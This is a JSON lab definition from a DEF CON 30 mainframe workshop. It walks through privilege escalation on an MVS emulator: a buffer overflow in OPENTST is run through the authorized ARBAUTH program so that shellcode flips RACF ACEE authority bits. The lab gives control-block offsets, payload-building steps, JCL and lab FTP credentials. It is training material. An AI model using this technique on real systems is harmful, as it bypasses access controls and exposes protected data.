@@ -1,0 +1,47 @@
+{
+  "id": "dc30-arbauth-privesc",
+  "title": "DC30 Lab 9: ARBAUTH Privilege Escalation — Follow the White Rabbit",
+  "description": "Use the ARBAUTH program to run code as AC=1 (authorized), exploit the OPENTST buffer overflow to modify your ACEE security control block in memory, escalate privileges, and read the protected WHITE.RABBIT dataset. The mainframe equivalent of a kernel exploit — using only documented system functions.",
+  "category": "security",
+  "difficulty": "advanced",
+  "source": "DC30_Workshop / DEFCON 30",
+  "walkthrough": true,
+  "steps": [
+    {
+      "title": "The Setup: WHITE.RABBIT",
+      "screen": " ISPF EDIT - WHITE.RABBIT(SCRIPT)\n\n ICH408I USER(HERC01  ) GROUP(SYS1    ) NAME(HERCULES USER  )\n   WHITE.RABBIT(SCRIPT)\n   ACCESS INTENT(READ   ) ACCESS ALLOWED(NONE   )\n\n You cannot read WHITE.RABBIT(SCRIPT).\n RACF denies access — you need elevated authority.\n\n The path:\n  1. ARBAUTH runs programs as AC=1 (authorized)\n  2. OPENTST has a buffer overflow\n  3. Overflow → modify ACEE flags in memory\n  4. ACEE flags = your RACF authority\n  5. With SPECIAL authority → read anything",
+      "expected": "Confirm you cannot read WHITE.RABBIT(SCRIPT) and understand the attack chain.",
+      "hint": "RACF stores your current authority in the ACEE (Accessor Environment Element) — a control block in memory. If we can modify it, we change our effective permissions without touching the RACF database."
+    },
+    {
+      "title": "What is ARBAUTH?",
+      "screen": "ARBAUTH — Arbitrary Authorization Runner\n\nLocation: SYS2.LINKLIB(ARBAUTH)\n\nWhat it does:\n  ARBAUTH is an APF-authorized program (AC=1)\n  It accepts a program name as a parameter\n  It runs that program in authorized mode\n\nWhy this matters:\n  OPENTST has a buffer overflow\n  But OPENTST is NOT linked with AC=1\n  So OPENTST cannot use MODESET directly\n\n  ARBAUTH runs OPENTST as authorized\n  → OPENTST can now use privileged instructions\n  → Our shellcode runs in supervisor state\n  → We can modify the ACEE\n\nThis is a classic 'confused deputy' attack:\n  ARBAUTH is the deputy with authority\n  We confuse it into running our exploit code",
+      "expected": "Understand why ARBAUTH is needed and what the confused deputy pattern means.",
+      "hint": "In modern z/OS this would be caught by RACF program control. On TK5/MVS 3.8j, ARBAUTH is intentionally placed in SYS2.LINKLIB as a lab target."
+    },
+    {
+      "title": "The ACEE Control Block",
+      "screen": "ACEE — Accessor Environment Element\n\nThe ACEE is created by RACF at logon time.\nIt lives in your address space memory.\nIt controls what you're allowed to do RIGHT NOW.\n\nKey fields:\n  Offset +X'26' — Authority flags byte 1:\n    Bit 0 (X'80'): SPECIAL    — full RACF admin\n    Bit 2 (X'20'): OPERATIONS — access all datasets\n    Bit 4 (X'08'): AUDITOR    — audit authority\n    X'B1' = 10110001 = SPECIAL + OPERATIONS + AUDITOR\n\n  Offset +X'27' — Authority flags byte 2:\n    Bit 0 (X'80'): ALTER access to all resources\n\nControl block chain to reach ACEE:\n  PSA+X'224' → ASCB\n  ASCB+X'6C' → ASXB\n  ASXB+X'C8' → ACEE\n  ACEE+X'26' → flip to X'B1'\n\nAfter modification: instant SPECIAL authority",
+      "expected": "Understand the ACEE structure and which bits to flip for privilege escalation.",
+      "hint": "This is the same control block chain used in the APF privesc lab. The difference here is we reach it via a buffer overflow + ARBAUTH rather than directly via MODESET in our own APF program."
+    },
+    {
+      "title": "Generate the Privesc Shellcode",
+      "screen": " ISPF EDIT - HERC01.JCLLIB(LAB11)\n Command ===> SUBMIT\n\n //LAB11    JOB ...\n //STEP01   EXEC PGM=ACEEGEN\n //SYSPRINT DD SYSOUT=*\n //SYSUT2   DD DSN=HERC01.LOAD(ACEEJOB),DISP=SHR\n\n After submit:\n  HERC01.LOAD(ACEEJOB) contains shellcode that:\n  1. Walks PSA → ASCB → ASXB → ACEE\n  2. Sets ACEE+X'26' to X'B1'\n  3. Sets ACEE+X'27' to X'80'\n\n Download via FTP:\n  ftp localhost 2121\n  user: HERC01  pass: CUL8TR\n  cd HERC01.LOAD\n  bin\n  get ACEEJOB",
+      "expected": "Submit LAB11 to generate ACEEJOB shellcode. Download it via FTP.",
+      "hint": "FTP is on port 2121 after submitting jcl/ftpd.jcl. Use binary mode (bin) for all binary file transfers — ASCII mode will corrupt EBCDIC data."
+    },
+    {
+      "title": "Build the Exploit Payload",
+      "screen": "Building the overflow payload:\n\n1. You have: DEBRUIJN (400-byte De Bruijn pattern)\n2. You have: ACEEJOB (shellcode to modify ACEE)\n\n3. Find the CAFEBABE marker in ACEEJOB\n   (this marks where the shellcode starts)\n\n4. Copy bytes between CAFEBABE markers\n\n5. Paste into DEBRUIJN at byte offset 257\n   (the offset where R14 gets overwritten)\n\n6. Save as file: PRIVESC\n\n7. Upload via FTP to HERC01.OVERFLOW.ARBAUTH(PRIVESC)\n   ftp localhost 2121\n   cd HERC01.OVERFLOW.ARBAUTH\n   bin\n   put PRIVESC\n\nTools: use scripts/findbytes.py to find byte sequences",
+      "expected": "Build the PRIVESC payload by combining De Bruijn + ACEEJOB shellcode. Upload via FTP.",
+      "hint": "The CAFEBABE marker is a well-known magic number used to delimit shellcode boundaries. Use a hex editor (okteta on Linux, xxd on Mac) to find and extract the bytes."
+    },
+    {
+      "title": "Execute the Exploit",
+      "screen": " ISPF EDIT - HERC01.JCLLIB(LAB12)\n\n //LAB12    JOB ...\n //ARBAUTH  EXEC PGM=ARBAUTH,PARM='OPENTST'\n //STEPLIB  DD DSN=SYS2.LINKLIB,DISP=SHR\n //STDIN    DD DSN=HERC01.OVERFLOW.ARBAUTH(PRIVESC),DISP=SHR\n //STEP01   EXEC PGM=IEBGENER,COND=EVEN\n //SYSUT1   DD DSN=WHITE.RABBIT(SCRIPT),DISP=SHR\n //SYSUT2   DD SYSOUT=*\n\n Submit LAB12.\n\n Expected job log output:\n  WRITING COMPLETE          ← ACEE modified\n  [contents of WHITE.RABBIT(SCRIPT)]  ← we can read it now!",
+      "expected": "Submit LAB12. See WRITING COMPLETE and the contents of WHITE.RABBIT(SCRIPT) in the job log.",
+      "hint": "COND=EVEN means step 2 runs even if step 1 abends. Step 1 (ARBAUTH+OPENTST) will abend after modifying the ACEE — that's expected. Step 2 (IEBGENER) then runs with our elevated ACEE and reads the protected file."
+    }
+  ]
+}
